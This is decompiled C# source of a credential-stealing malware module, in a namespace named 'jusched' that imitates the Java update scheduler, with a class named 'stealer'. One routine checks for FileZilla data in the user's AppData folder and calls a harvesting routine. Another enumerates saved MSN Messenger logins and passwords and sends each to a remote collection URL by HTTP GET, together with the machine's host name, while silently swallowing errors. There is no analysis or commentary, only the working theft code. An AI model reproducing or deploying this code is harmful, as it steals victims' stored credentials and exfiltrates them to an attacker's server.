using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;
using jusched.ftp;

namespace jusched;

public class stealer
{
	[DebuggerNonUserCode]
	public stealer()
	{
	}

	public static void not_ste0()
	{
		ftp_0();
		ste_0();
	}

	private static void ftp_0()
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla");
			if (Directory.Exists(path))
			{
				fzill.nuevo();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void ste_0()
	{
		CMSNMessengerPasswords cMSNMessengerPasswords = new CMSNMessengerPasswords();
		foreach (CMSNMessengerPassword item in cMSNMessengerPasswords)
		{
			string login = item.Login;
			int i = 0;
			for (int length = login.Length; i < length; i = checked(i + 1))
			{
				_ = login[i];
				global_0.webget(Configuration.stnot + "?action=add&a=0&u=http://www.hotmail.com&l=" + item.Login + "&p=" + item.Password + "&c=" + Configuration.strHostName);
			}
		}
	}
}
